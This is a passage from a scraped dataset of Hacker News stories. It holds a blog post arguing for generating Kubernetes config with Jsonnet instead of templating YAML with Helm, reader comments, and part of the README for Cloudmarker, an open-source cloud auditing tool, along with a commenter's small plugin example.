          "Published Feb 7, 2019 by Lee Briggs #kubernetes #configuration mgmt #jsonnet #helm #kr8 I was at cfgmgmtcamp 2019 in Ghent, and did a talk which I think was well received about the need for some Kubernetes configuration management as well as the solution we built for it at $work, kr8. I made a statement during the talk which ignited some fairly fierce discussion both online, and at the conference: \"If you're starting to template yaml, ask yourself the question: why am I not *generating* json?\" - @briggsl spitting straight fire at #cfgmgmtcamp eric sorenson (@ahpook) February 5, 2019 To put this into my own words: At some point, we decided it was okay for us to template yaml. When did this happen? How is this acceptable? After some conversation, I figured it was probably best to back up my claims in some way. This blog post is going to try to do that. The configuration problem Once the applications and infrastructure youre going to manage grows past a certain size, you inevitably end up in some form of configuration complexity hell. If youre only deploying 1 or maybe 2 things, you can write a yaml configuration file and be done with it. However once you grow beyond that, you need to figure out how to manage this complexity. Its incredibly likely that the reason you have multiple configuration files is because the $thing that uses that config is slightly different from its companions. Examples of this include: Applications deployed in different environments, like dev, stg and prod Applications deployed in different regions, like Europe or North American Obviously, not all the configuration is different here, but its likely the configuration differs enough that you want to be able to differentiate between the two. This configuration complexity has been well known for Operators (System Administrators, DevOps engineers, whatever you want to call them) for some years now. An entire discpline grew up around this in Configuration Management, and each tool solved this problem in their own way, but ultimately, they used YAML to get the job done. My favourite method has always been hiera which comes bundled with Puppet. Having the ability to hierarchically look up the variables of specific config needs is incredibly powerful and flexible, and has generally meant you dont actually need to do any templating of yaml at all, except perhaps for embedding Puppet facts into the yaml. Did we go backwards? Then, as our industries needs moved above the operating system and into cloud computing, we had a whole new data plane to configure. The tooling to configure this changed, and tools like CloudFormation and Helm appeared. These tools are excellent configuration tools, but I firmly believe we (as an industry) got something really, really wrong when we designed them. To examine that, lets take a look at example of a helm chart taking a custom parameter Helm Charts Helm charts can take external parameters defined by an values.yaml file which you specify when rendering the chart. A simple example might look like this: Lets say my external parameter is simple - its a string. Itd look a bit like this: image: \"{{ .Values.image }}\" Thats not so bad right? You just specify a value for image in your values.yaml and youre on your way. The real problem starts to get highlighted when you want to do more complicated and complex things. In this particular example, youre doing okay because you know you have to specify an image for a Kubernetes deployment. However, what if youre working with something like an optional field? Well, then it gets a little more unwieldy: {{- with .resourceGroup }} resourceGroup: {{ . }} {{- end }} Optional values just make things ugly in templating languages, and you cant just leave the value blank, so you have to resort to ugly loops and conditionals that are probably going to bite you later. Lets say you need to go a step further, and you need to push an array or map into the config. With helm, youd do something like this. {{- with .Values.podAnnotations }} annotations: {{ toYaml . | indent 8 }} {{- end }} Firstly, lets ignore the madness of having a templating function toYaml to convert yaml to yaml and focus more on the whitespace issue here. YAML has strict requirements and whitespace implementation rules. The following, for example, is not valid or complete yaml: something: nothing hello: goodbye Generally, if youre handwriting something, this isnt necessarily a problem because you just hit backspace twice and its fixed. However, if youre generating YAML using a templating system, you cant do that - and if youre operating above 5 or 10 configuration files, you probably want to be generating your config rather than writing it. So, in the above example, you want to embed the values of .Values.podAnnotations under the annotations field, which is indented already. So youre having to not only indent your values, but indent them correctly. What makes this even more confusing is that the go parser doesnt actually know anything about YAML at all, so if you try to keep the syntax clean and indent the templates like this: {{- with .Values.podAnnotations }} annotations: {{ toYaml . | indent 6 }} {{- end }} You actually cant do that, because the templating system gets confused. This is a singular example of the complexity and difficulty you end up facing when generating config data in YAML, but when you really start to do more complex work, it really starts to become obvious that this isnt the way to go. Needless to say, this isnt what I want to spend my time doing. If fiddling around with whitespace requirements in a templating system doing something its not really designed for is what suits you, then Im not going to stop you. I also dont want to spend my time writing configuration in JSON without comments and accidentally missing commas all over the shop. We (as an industry) decided a long time ago that shit wasnt going to work and thats why YAML exists. So what should we do instead? Thats where jsonnet comes in. JSON, Jsonnet & YAML Before we actually talk about Jsonnet, its worth reminding people of a very important (but oft forgotten point). YAML is a superset of JSON and converting between the two is trivial. Many applications and programming languages will parse JSON and YAML natively, and many can convert between the two very simple. For example, in Python: python -c 'import json, sys, yaml ; y=yaml.safe_load(sys.stdin.read()) ; print(json.dumps(y))' So with that in mind, lets talk about Jsonnet. Welcome to the church of Jsonnet Jsonnet is a relatively new, little known (outside the Kubernetes community?) language that calls itself a data templating language. Its definitely a good exercise to read and consume the Jsonnet design rationale page to get an idea why it exists, but if I was going to define in a nutshell what its purpose is - its to generate JSON config. So, how does it help, exactly? Well, lets take our earlier example - we want to generate some JSON config specifying a parameter (ie, the image string). We can do that very very easily with Jsonnet using external variables. Firstly, lets define some Jsonnet: { image: std.extVar('image'), } Then, we can generate it using the Jsonnet command line tool, passing in the external variable as we need to: jsonnet image.jsonnet -V image=\"my-image\" { \"image\": \"my-image\" } Easy! Optional fields Before, I noted that if you wanted to define an optional field, with YAML templating you had to define if statements for everything. With Jsonnet, youre just defining code! // define a variable - yes, jsonnet also has comments local rg = null; { image: std.extVar('image'), // if the variable is null, this will be blank [if rg != null then 'resourceGroup']: rg, } The output here, because our variable is null, means that we never actually populate resourceGroup. If you specify a value, it will appear: jsonnet image.jsonnet -V image=\"my-image\" { \"image\": \"my-image\" } Maps and parameters Okay, now lets look at our previous annotation example. We want to define some pod annotations, which takes a YAML map as its input. You want this map to be configurable by specifying external data, and obviously doing that on the command line sucks (youd be very unlikely to specify this with Helm on the command line, for example) so generally youd use Jsonnet imports to this. Im going to specify this config as a variable and then load that variable into the annotation: local annotations = { 'nginx.ingress.kubernetes.io/app-root': '/', 'nginx.ingress.kubernetes.io/enable-cors': true, }; { metadata: { // annotations are nested under the metadata of a pod annotations: annotations, }, } This might just be my bias towards Jsonnet talking, but this is so dramatically easier than faffing about with indentation that I cant even begin to describe it. Additional goodies The final thing I wanted to quickly explore, which is something that I feel cant really be done with Helm and other yaml templating tools, is the concept of manipulating existing objects in config. Lets take our example above with the annotations, and look at the result file: { \"metadata\": { \"annotations\": { \"nginx.ingress.kubernetes.io/app-root\": \"/\", \"nginx.ingress.kubernetes.io/enable-cors\": true } } } Now, lets say for example I wanted to append a set of annotations to this annotations map. In any templating system, Id probably have to rewrite the whole map. Jsonnet makes this trivial. I can simply use the + operator to add something to this. Heres a (poor) example: local annotations = { 'nginx.ingress.kubernetes.io/app-root': '/', 'nginx.ingress.kubernetes.io/enable-cors': true, }; { metadata: { annotations: annotations, }, } + { // this adds another JSON object metadata+: { // I'm using the + operator, so we'll append to the existing metadata annotations+: { // same as above something: 'nothing', }, }, } The end result is this: { \"metadata\": { \"annotations\": { \"nginx.ingress.kubernetes.io/app-root\": \"/\", \"nginx.ingress.kubernetes.io/enable-cors\": true, \"something\": \"nothing\" } } } Obviously, in this case, its more code to this, but as your example get more complex, it becomes extremely useful to be able to manipulate objects this way. Kr8 We use all of these methods in kr8 to make creating and manipulating configuration for multiple Kubernetes clusters easy and simple. I highly recommend you check it out if any of the concepts youve found here have found you nodding your head. ",
          "I know I'm in a minority, but I really dislike YAML... I recently did a lot of Ansible and boy, at the beginning, I was just struggling a lot. Syntactic whitespace kills me.<p>I don't like it in Python either, but for some reason, when I write Python, it's a lot easier. Maybe YAML is just a bit more complex (and Python has better IDE support..?)",
          "My belief is that we've been slowly building up to using general purpose languages, one small step at a time, throughout the infrastructure as code, DevOps, and SRE journeys this past 10 years. INI files, XML, JSON, and YAML aren't sufficiently expressive -- lacking for loops, conditionals, variable references, and any sort of abstraction -- so, of course, we add templates to it. But as the author (IMHO rightfully) points out, we just end up with a funky, poor approximation of a language.<p>I think this approach is a byproduct of thinking about infrastructure and configuration -- and the cloud generally -- as an \"afterthought,\" not a core part of an application's infrastructure. Containers, Kubernetes, serverless, and more hosted services all change this, and Chef, Puppet, and others laid the groundwork to think differently about what the future looks like. More developers today than ever before need to think about how to build and configure cloud software.<p>We started the Pulumi project to solve this very problem, so I'm admittedly biased, and I hope you forgive the plug -- I only mention it here because I think it contributes to the discussion. Our approach is to simply use general purpose languages like TypeScript, Python, and Go, while still having infrastructure as code. An important thing to realize is that infrastructure as code is based on the idea of a <i>goal state</i>. Using a full blown language to generate that goal state generally doesn't threaten the repeatability, determinism, or robustness of the solution, provided you've got an engine handling state management, diffing, resource CRUD, and so on. We've been able to apply this universally across AWS, Azure, GCP, <i>and</i> Kubernetes, often mixing their configuration in the same program.<p>Again, I'm biased and want to admit that, however if you're sick of YAML, it's definitely worth checking out. We'd love your feedback:<p>- Project website: <a href=\"https://pulumi.io/\" rel=\"nofollow\">https://pulumi.io/</a><p>- All open source on GitHub: <a href=\"https://github.com/pulumi/pulumi\" rel=\"nofollow\">https://github.com/pulumi/pulumi</a><p>- Example of abstractions: <a href=\"https://blog.pulumi.com/the-fastest-path-to-deploying-kubernetes-on-aws-with-eks-and-pulumi\" rel=\"nofollow\">https://blog.pulumi.com/the-fastest-path-to-deploying-kubern...</a><p>- Example of serverless as event handlers: <a href=\"https://blog.pulumi.com/lambdas-as-lambdas-the-magic-of-simple-serverless-functions\" rel=\"nofollow\">https://blog.pulumi.com/lambdas-as-lambdas-the-magic-of-simp...</a><p>Pulumi may not be <i>the</i> solution for everyone, but I'm fairly optimistic that this is where we're all heading.<p>Joe"
        ],
        "story_type": ["Normal"],
        "url": "https://leebriggs.co.uk/blog/2019/02/07/why-are-we-templating-yaml.html",
        "comments.comment_id": [19109135, 19109540],
        "comments.comment_author": ["BossingAround", "joeduffy"],
        "comments.comment_descendants": [12, 19],
        "comments.comment_time": [
          "2019-02-07T22:14:16Z",
          "2019-02-07T22:58:45Z"
        ],
        "comments.comment_text": [
          "I know I'm in a minority, but I really dislike YAML... I recently did a lot of Ansible and boy, at the beginning, I was just struggling a lot. Syntactic whitespace kills me.<p>I don't like it in Python either, but for some reason, when I write Python, it's a lot easier. Maybe YAML is just a bit more complex (and Python has better IDE support..?)",
          "My belief is that we've been slowly building up to using general purpose languages, one small step at a time, throughout the infrastructure as code, DevOps, and SRE journeys this past 10 years. INI files, XML, JSON, and YAML aren't sufficiently expressive -- lacking for loops, conditionals, variable references, and any sort of abstraction -- so, of course, we add templates to it. But as the author (IMHO rightfully) points out, we just end up with a funky, poor approximation of a language.<p>I think this approach is a byproduct of thinking about infrastructure and configuration -- and the cloud generally -- as an \"afterthought,\" not a core part of an application's infrastructure. Containers, Kubernetes, serverless, and more hosted services all change this, and Chef, Puppet, and others laid the groundwork to think differently about what the future looks like. More developers today than ever before need to think about how to build and configure cloud software.<p>We started the Pulumi project to solve this very problem, so I'm admittedly biased, and I hope you forgive the plug -- I only mention it here because I think it contributes to the discussion. Our approach is to simply use general purpose languages like TypeScript, Python, and Go, while still having infrastructure as code. An important thing to realize is that infrastructure as code is based on the idea of a <i>goal state</i>. Using a full blown language to generate that goal state generally doesn't threaten the repeatability, determinism, or robustness of the solution, provided you've got an engine handling state management, diffing, resource CRUD, and so on. We've been able to apply this universally across AWS, Azure, GCP, <i>and</i> Kubernetes, often mixing their configuration in the same program.<p>Again, I'm biased and want to admit that, however if you're sick of YAML, it's definitely worth checking out. We'd love your feedback:<p>- Project website: <a href=\"https://pulumi.io/\" rel=\"nofollow\">https://pulumi.io/</a><p>- All open source on GitHub: <a href=\"https://github.com/pulumi/pulumi\" rel=\"nofollow\">https://github.com/pulumi/pulumi</a><p>- Example of abstractions: <a href=\"https://blog.pulumi.com/the-fastest-path-to-deploying-kubernetes-on-aws-with-eks-and-pulumi\" rel=\"nofollow\">https://blog.pulumi.com/the-fastest-path-to-deploying-kubern...</a><p>- Example of serverless as event handlers: <a href=\"https://blog.pulumi.com/lambdas-as-lambdas-the-magic-of-simple-serverless-functions\" rel=\"nofollow\">https://blog.pulumi.com/lambdas-as-lambdas-the-magic-of-simp...</a><p>Pulumi may not be <i>the</i> solution for everyone, but I'm fairly optimistic that this is where we're all heading.<p>Joe"
        ],
        "id": "707dea99-8296-4289-8c0a-e749324266eb",
        "url_text": "Published Feb 7, 2019 by Lee Briggs #kubernetes #configuration mgmt #jsonnet #helm #kr8 I was at cfgmgmtcamp 2019 in Ghent, and did a talk which I think was well received about the need for some Kubernetes configuration management as well as the solution we built for it at $work, kr8. I made a statement during the talk which ignited some fairly fierce discussion both online, and at the conference: \"If you're starting to template yaml, ask yourself the question: why am I not *generating* json?\" - @briggsl spitting straight fire at #cfgmgmtcamp eric sorenson (@ahpook) February 5, 2019 To put this into my own words: At some point, we decided it was okay for us to template yaml. When did this happen? How is this acceptable? After some conversation, I figured it was probably best to back up my claims in some way. This blog post is going to try to do that. The configuration problem Once the applications and infrastructure youre going to manage grows past a certain size, you inevitably end up in some form of configuration complexity hell. If youre only deploying 1 or maybe 2 things, you can write a yaml configuration file and be done with it. However once you grow beyond that, you need to figure out how to manage this complexity. Its incredibly likely that the reason you have multiple configuration files is because the $thing that uses that config is slightly different from its companions. Examples of this include: Applications deployed in different environments, like dev, stg and prod Applications deployed in different regions, like Europe or North American Obviously, not all the configuration is different here, but its likely the configuration differs enough that you want to be able to differentiate between the two. This configuration complexity has been well known for Operators (System Administrators, DevOps engineers, whatever you want to call them) for some years now. An entire discpline grew up around this in Configuration Management, and each tool solved this problem in their own way, but ultimately, they used YAML to get the job done. My favourite method has always been hiera which comes bundled with Puppet. Having the ability to hierarchically look up the variables of specific config needs is incredibly powerful and flexible, and has generally meant you dont actually need to do any templating of yaml at all, except perhaps for embedding Puppet facts into the yaml. Did we go backwards? Then, as our industries needs moved above the operating system and into cloud computing, we had a whole new data plane to configure. The tooling to configure this changed, and tools like CloudFormation and Helm appeared. These tools are excellent configuration tools, but I firmly believe we (as an industry) got something really, really wrong when we designed them. To examine that, lets take a look at example of a helm chart taking a custom parameter Helm Charts Helm charts can take external parameters defined by an values.yaml file which you specify when rendering the chart. A simple example might look like this: Lets say my external parameter is simple - its a string. Itd look a bit like this: image: \"{{ .Values.image }}\" Thats not so bad right? You just specify a value for image in your values.yaml and youre on your way. The real problem starts to get highlighted when you want to do more complicated and complex things. In this particular example, youre doing okay because you know you have to specify an image for a Kubernetes deployment. However, what if youre working with something like an optional field? Well, then it gets a little more unwieldy: {{- with .resourceGroup }} resourceGroup: {{ . }} {{- end }} Optional values just make things ugly in templating languages, and you cant just leave the value blank, so you have to resort to ugly loops and conditionals that are probably going to bite you later. Lets say you need to go a step further, and you need to push an array or map into the config. With helm, youd do something like this. {{- with .Values.podAnnotations }} annotations: {{ toYaml . | indent 8 }} {{- end }} Firstly, lets ignore the madness of having a templating function toYaml to convert yaml to yaml and focus more on the whitespace issue here. YAML has strict requirements and whitespace implementation rules. The following, for example, is not valid or complete yaml: something: nothing hello: goodbye Generally, if youre handwriting something, this isnt necessarily a problem because you just hit backspace twice and its fixed. However, if youre generating YAML using a templating system, you cant do that - and if youre operating above 5 or 10 configuration files, you probably want to be generating your config rather than writing it. So, in the above example, you want to embed the values of .Values.podAnnotations under the annotations field, which is indented already. So youre having to not only indent your values, but indent them correctly. What makes this even more confusing is that the go parser doesnt actually know anything about YAML at all, so if you try to keep the syntax clean and indent the templates like this: {{- with .Values.podAnnotations }} annotations: {{ toYaml . | indent 6 }} {{- end }} You actually cant do that, because the templating system gets confused. This is a singular example of the complexity and difficulty you end up facing when generating config data in YAML, but when you really start to do more complex work, it really starts to become obvious that this isnt the way to go. Needless to say, this isnt what I want to spend my time doing. If fiddling around with whitespace requirements in a templating system doing something its not really designed for is what suits you, then Im not going to stop you. I also dont want to spend my time writing configuration in JSON without comments and accidentally missing commas all over the shop. We (as an industry) decided a long time ago that shit wasnt going to work and thats why YAML exists. So what should we do instead? Thats where jsonnet comes in. JSON, Jsonnet & YAML Before we actually talk about Jsonnet, its worth reminding people of a very important (but oft forgotten point). YAML is a superset of JSON and converting between the two is trivial. Many applications and programming languages will parse JSON and YAML natively, and many can convert between the two very simple. For example, in Python: python -c 'import json, sys, yaml ; y=yaml.safe_load(sys.stdin.read()) ; print(json.dumps(y))' So with that in mind, lets talk about Jsonnet. Welcome to the church of Jsonnet Jsonnet is a relatively new, little known (outside the Kubernetes community?) language that calls itself a data templating language. Its definitely a good exercise to read and consume the Jsonnet design rationale page to get an idea why it exists, but if I was going to define in a nutshell what its purpose is - its to generate JSON config. So, how does it help, exactly? Well, lets take our earlier example - we want to generate some JSON config specifying a parameter (ie, the image string). We can do that very very easily with Jsonnet using external variables. Firstly, lets define some Jsonnet: { image: std.extVar('image'), } Then, we can generate it using the Jsonnet command line tool, passing in the external variable as we need to: jsonnet image.jsonnet -V image=\"my-image\" { \"image\": \"my-image\" } Easy! Optional fields Before, I noted that if you wanted to define an optional field, with YAML templating you had to define if statements for everything. With Jsonnet, youre just defining code! // define a variable - yes, jsonnet also has comments local rg = null; { image: std.extVar('image'), // if the variable is null, this will be blank [if rg != null then 'resourceGroup']: rg, } The output here, because our variable is null, means that we never actually populate resourceGroup. If you specify a value, it will appear: jsonnet image.jsonnet -V image=\"my-image\" { \"image\": \"my-image\" } Maps and parameters Okay, now lets look at our previous annotation example. We want to define some pod annotations, which takes a YAML map as its input. You want this map to be configurable by specifying external data, and obviously doing that on the command line sucks (youd be very unlikely to specify this with Helm on the command line, for example) so generally youd use Jsonnet imports to this. Im going to specify this config as a variable and then load that variable into the annotation: local annotations = { 'nginx.ingress.kubernetes.io/app-root': '/', 'nginx.ingress.kubernetes.io/enable-cors': true, }; { metadata: { // annotations are nested under the metadata of a pod annotations: annotations, }, } This might just be my bias towards Jsonnet talking, but this is so dramatically easier than faffing about with indentation that I cant even begin to describe it. Additional goodies The final thing I wanted to quickly explore, which is something that I feel cant really be done with Helm and other yaml templating tools, is the concept of manipulating existing objects in config. Lets take our example above with the annotations, and look at the result file: { \"metadata\": { \"annotations\": { \"nginx.ingress.kubernetes.io/app-root\": \"/\", \"nginx.ingress.kubernetes.io/enable-cors\": true } } } Now, lets say for example I wanted to append a set of annotations to this annotations map. In any templating system, Id probably have to rewrite the whole map. Jsonnet makes this trivial. I can simply use the + operator to add something to this. Heres a (poor) example: local annotations = { 'nginx.ingress.kubernetes.io/app-root': '/', 'nginx.ingress.kubernetes.io/enable-cors': true, }; { metadata: { annotations: annotations, }, } + { // this adds another JSON object metadata+: { // I'm using the + operator, so we'll append to the existing metadata annotations+: { // same as above something: 'nothing', }, }, } The end result is this: { \"metadata\": { \"annotations\": { \"nginx.ingress.kubernetes.io/app-root\": \"/\", \"nginx.ingress.kubernetes.io/enable-cors\": true, \"something\": \"nothing\" } } } Obviously, in this case, its more code to this, but as your example get more complex, it becomes extremely useful to be able to manipulate objects this way. Kr8 We use all of these methods in kr8 to make creating and manipulating configuration for multiple Kubernetes clusters easy and simple. I highly recommend you check it out if any of the concepts youve found here have found you nodding your head. ",
        "_version_": 1718527385320554496
      },
      {
        "story_id": [19898568],
        "story_author": ["cloudmarker"],
        "story_descendants": [16],
        "story_score": [73],
        "story_time": ["2019-05-13T12:26:56Z"],
        "story_title": "Show HN: Cloudmarker – Cloud monitoring tool and framework",
        "search": [
          "Show HN: Cloudmarker – Cloud monitoring tool and framework",
          "https://github.com/cloudmarker/cloudmarker",
          "Cloudmarker Cloudmarker is a cloud monitoring tool and framework. Contents Table of Contents: Contents What is Cloudmarker? Why Cloudmarker? Features Wishlist Install Develop Resources Support License What is Cloudmarker? Cloudmarker is a cloud monitoring tool and framework. It can be used as a ready-made tool that audits your Azure or GCP cloud environments as well as a framework that allows you to develop your own cloud monitoring software to audit your clouds. As a monitoring tool, it performs the following actions: Retrieves data about each configured cloud using the cloud APIs. Saves or indexes the retrieved data into each configured storage system or indexing engine. Analyzes the data for potential issues and generates events that represent the detected issues. Saves the events to configured storage or indexing engines as well as sends the events as alerts to alerting destinations. Each of the above four aspects of the tool can be configured via a configuration file. For example, the tool can be configured to pull data from Azure and index its data in Elasticsearch while it also pulls data from GCP and indexes the GCP data in MongoDB. Similarly, it is possible to configure the tool to check for unencrypted disks in Azure, generate events for it, and send them as alerts by email while it checks for insecure firewall rules in both Azure and GCP, generate events for them, and save those events in MongoDB. This degree of flexibility to configure audits for different clouds in different ways comes from the fact that Cloudmarker is designed as a combination of lightweight framework and a bunch of plugins that do the heavylifting for retrieving cloud data, storing the data, analyzing the data, generating events, and sending alerts. These four types of plugins are formally known as cloud plugins, store plugins, event plugins, and alert plugins, respectively. As a result of this plugin-based architecture, Cloudmarker can also be used as a framework to develop your own plugins that extend its capabilities by adding support for new types of clouds or data sources, storage or indexing engines, event generation, and alerting destinations. Why Cloudmarker? One might wonder why we need a new project like this when similar projects exist. When we began working on this project in 2017, we were aware of similar tools that supported AWS and GCP but none that supported Azure at that time. As a result, we wrote our own tool to support Azure. We later added support for GCP as well. What began as a tiny proof of concept gradually turned into a fair amount of code, so we thought, we might as well share this project online, so that others could use it and see if they find value in it. So far, some of the highlights of this project are: It is simple. It is easy to understand how to use the four types of plugins (clouds, stores, events, and alerts) to perform an audit. It is excellent at creating an inventory of the cloud environment. The data inventory it creates is easy to query. It is good at detecting insecure firewall rules and unencrypted disks. New detection mechanisms are coming up. We also realize that we can add a lot more functionality to this project to make it more powerful too. See the Wishlist section below to see new features we would like to see in this project. Our project is hosted on GitHub at https://github.com/cloudmarker/cloudmarker. Contributions and pull requests are welcome. We hope that you would give this project a shot, see if it addresses your needs, and provide us some feedback by posting a comment in our feedback thread or by creating a new issue. Features Since Cloudmarker is not just a tool but also a framework, a lot of its functionality can be extended by writing plugins. However, Cloudmarker also comes bundled with a default set of plugins that can be used as is without writing a single line of code. Here is a brief overview of the features that come bundled with Cloudmarker: Perform scheduled or ad hoc audits of cloud environment. Retrieve data from Azure and GCP. Store or index retrieved data in Elasticsearch, MongoDB, Splunk, and the file system. Look for insecure firewall rules and generate firewall rule events. Look for unencrypted disks (Azure only) and generate events. Send alerts for events via email and Slack as well as save alerts in one of the supported storage or indexing engines (see the third point above). Normalize firewall rules from Azure and GCP which are in different formats to a common object model (\"com\") so that a single query or event rule can search for or detect issues in firewall rules from both clouds. Wishlist Add more event plugins to detect different types of insecure configuration. Normalize other types of data into a common object model (\"com\") just like we do right now for firewall rules. Install Perform the following steps to set up Cloudmarker. Create a virtual Python environment and install Cloudmarker in it: python3 -m venv venv . venv/bin/activate pip3 install cloudmarker Run sanity test: The above command runs a mock audit with mock plugins that generate some mock data. The mock data generated can be found at /tmp/cloudmarker/. Logs from the tool are written to the standard output as well as to /tmp/cloudmarker.log. The -n or --now option tells Cloudmarker to run right now instead of waiting for a scheduled run. To learn how to configure and use Cloudmarker with Azure or GCP clouds, see Cloudmarker Tutorial. Develop This section describes how to set up a development environment for Cloudmarker. This section is useful for those who would like to contribute to Cloudmarker or run Cloudmarker directly from its source. We use primarily three tools to perform development on this project: Python 3, Git, and Make. Your system may already have these tools. But if not, here are some brief instructions on how they can be installed. On macOS, if you have Homebrew installed, then these tools can be be installed easily with the following command: On a Debian GNU/Linux system or in another Debian-based Linux distribution, they can be installed with the following commands: apt-get update apt-get install python3 python3-venv git make On a CentOS Linux distribution, they can be installed with these commands: yum install centos-release-scl yum install git make rh-python36 scl enable rh-python36 bash Note: The scl enable command starts a new shell for you to use Python 3. On any other system, we hope you can figure out how to install these tools yourself. Clone the project repository and enter its top-level directory: git clone https://github.com/cloudmarker/cloudmarker.git cd cloudmarker Create a virtual Python environment for development purpose: This creates a virtual Python environment at ~/.venv/cloudmarker. Additionally, it also creates a convenience script named venv in the current directory to easily activate the virtual Python environment which we will soon see in the next point. To undo this step at anytime in future, i.e., delete the virtual Python environment directory, either enter rm -rf venv ~/.venv/cloudmarker or enter make rmvenv. Activate the virtual Python environment: In the top-level directory of the project, enter this command: python3 -m cloudmarker -n This generates mock data at /tmp/cloudmarker. This step serves as a sanity check that ensures that the development environment is correctly set up and that the Cloudmarker audit framework is running properly. Now that the project is set up correctly, you can create a cloudmarker.yaml to configure Cloudmarker to scan/audit your cloud or you can perform more development on the Cloudmarker source code. See Cloudmarker Tutorial for more details. If you have set up a development environment to perform more development on Cloudmarker, please consider sending a pull request to us if you think your development work would be useful to the community. Before sending a pull request, please run the unit tests, code coverage, linters, and document generator to ensure that no existing test has been broken and the pull request adheres to our coding conventions: make test make coverage make lint make docs To run these four targets in one shot, enter this \"shortcut\" target: Open htmlcov/index.html with a web browser to view the code coverage report. Open docs/_build/html/index.html with a web browser to view the generated documentation. Resources Here is a list of useful links about this project: Documentation on Read The Docs Latest release on PyPI Source code on GitHub Issue tracker on GitHub Changelog on GitHub Cloudmarker channel on Slack Invitation to Cloudmarker channel on Slack Support To report bugs, suggest improvements, or ask questions, please create a new issue at http://github.com/cloudmarker/cloudmarker/issues. License This is free software. You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of it, under the terms of the MIT License. See LICENSE.rst for the complete license. This software is provided WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See LICENSE.rst for the complete disclaimer. ",
          "What is the generally the best language while working on more than one cloud? If I want to deploy VMs into the major three clouds (AWS/GCP/Azure), is Python a good language for automation or am I better off with Java?",
          "I am trying this tool. First impression: The plugin framework works like charm. Creating a small plugin to get GitHub org repo info. Working with only two files. Plugin is one file and configuration yaml is other file.<p>I am not Python developer. I develop in Powershell. So don't judge my code. :)<p>I put this in ghcloud.py.<p><pre><code>  import urllib.request\n  import json\n\n  class GhCloud:\n      def __init__(self, org):\n          self.org = org\n\n      def read(self):\n          url = 'https://api.github.com/orgs/%s/repos' % self.org\n          data = json.loads(urllib.request.urlopen(url).read().decode('utf-8'))\n          for d in data: yield d\n\n      def done(self):\n          pass\n</code></pre>\nI put this in cloudmarker.yaml.<p><pre><code>  plugins:\n    ghplug:\n      plugin: ghcloud.GhCloud\n      params:\n        org: python\n\n  audits:\n    ghmon:\n      clouds:\n      - ghplug\n      stores:\n      - esstore\n      - filestore\n\n  run:\n  - ghmon\n</code></pre>\nI run tool.<p><pre><code>  PYTHONPATH=. cloudmarker --now\n</code></pre>\nCloudmarker runs my ghcloud.py and puts data into localhost:9200 and /tmp automatically. I can do it without cloning Cloudmarker code. I only hack my code and Cloudmarker runs it."
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/cloudmarker/cloudmarker",
        "comments.comment_id": [19898712, 19900677],
        "comments.comment_author": ["200px", "msnut"],
        "comments.comment_descendants": [3, 0],
        "comments.comment_time": [
          "2019-05-13T12:49:43Z",
          "2019-05-13T16:07:14Z"
        ],
        "comments.comment_text": [
          "What is the generally the best language while working on more than one cloud? If I want to deploy VMs into the major three clouds (AWS/GCP/Azure), is Python a good language for automation or am I better off with Java?",
          "I am trying this tool. First impression: The plugin framework works like charm. Creating a small plugin to get GitHub org repo info. Working with only two files. Plugin is one file and configuration yaml is other file.<p>I am not Python developer. I develop in Powershell. So don't judge my code. :)<p>I put this in ghcloud.py.<p><pre><code>  import urllib.request\n  import json\n\n  class GhCloud:\n      def __init__(self, org):\n          self.org = org\n\n      def read(self):\n          url = 'https://api.github.com/orgs/%s/repos' % self.org\n          data = json.loads(urllib.request.urlopen(url).read().decode('utf-8'))\n          for d in data: yield d\n\n      def done(self):\n          pass\n</code></pre>\nI put this in cloudmarker.yaml.<p><pre><code>  plugins:\n    ghplug:\n      plugin: ghcloud.GhCloud\n      params:\n        org: python\n\n  audits:\n    ghmon:\n      clouds:\n      - ghplug\n      stores:\n      - esstore\n      - filestore\n\n  run:\n  - ghmon\n</code></pre>\nI run tool.<p><pre><code>  PYTHONPATH=. cloudmarker --now\n</code></pre>\nCloudmarker runs my ghcloud.py and puts data into localhost:9200 and /tmp automatically. I can do it without cloning Cloudmarker code. I only hack my code and Cloudmarker runs it."
        ],
        "id": "45eb27a5-6ded-4bbb-8cbe-36fd3d2b69dd",
        "url_text": "Cloudmarker Cloudmarker is a cloud monitoring tool and framework. Contents Table of Contents: Contents What is Cloudmarker? Why Cloudmarker? Features Wishlist Install Develop Resources Support License What is Cloudmarker? Cloudmarker is a cloud monitoring tool and framework. It can be used as a ready-made tool that audits your Azure or GCP cloud environments as well as a framework that allows you to develop your own cloud monitoring software to audit your clouds. As a monitoring tool, it performs the following actions: Retrieves data about each configured cloud using the cloud APIs. Saves or indexes the retrieved data into each configured storage system or indexing engine. Analyzes the data for potential issues and generates events that represent the detected issues. Saves the events to configured storage or indexing engines as well as sends the events as alerts to alerting destinations. Each of the above four aspects of the tool can be configured via a configuration file. For example, the tool can be configured to pull data from Azure and index its data in Elasticsearch while it also pulls data from GCP and indexes the GCP data in MongoDB. Similarly, it is possible to configure the tool to check for unencrypted disks in Azure, generate events for it, and send them as alerts by email while it checks for insecure firewall rules in both Azure and GCP, generate events for them, and save those events in MongoDB. This degree of flexibility to configure audits for different clouds in different ways comes from the fact that Cloudmarker is designed as a combination of lightweight framework and a bunch of plugins that do the heavylifting for retrieving cloud data, storing the data, analyzing the data, generating events, and sending alerts. These four types of plugins are formally known as cloud plugins, store plugins, event plugins, and alert plugins, respectively. As a result of this plugin-based architecture, Cloudmarker can also be used as a framework to develop your own plugins that extend its capabilities by adding support for new types of clouds or data sources, storage or indexing engines, event generation, and alerting destinations. Why Cloudmarker? One might wonder why we need a new project like this when similar projects exist. When we began working on this project in 2017, we were aware of similar tools that supported AWS and GCP but none that supported Azure at that time. As a result, we wrote our own tool to support Azure. We later added support for GCP as well. What began as a tiny proof of concept gradually turned into a fair amount of code, so we thought, we might as well share this project online, so that others could use it and see if they find value in it. So far, some of the highlights of this project are: It is simple. It is easy to understand how to use the four types of plugins (clouds, stores, events, and alerts) to perform an audit. It is excellent at creating an inventory of the cloud environment. The data inventory it creates is easy to query. It is good at detecting insecure firewall rules and unencrypted disks. New detection mechanisms are coming up. We also realize that we can add a lot more functionality to this project to make it more powerful too. See the Wishlist section below to see new features we would like to see in this project. Our project is hosted on GitHub at https://github.com/cloudmarker/cloudmarker. Contributions and pull requests are welcome. We hope that you would give this project a shot, see if it addresses your needs, and provide us some feedback by posting a comment in our feedback thread or by creating a new issue. Features Since Cloudmarker is not just a tool but also a framework, a lot of its functionality 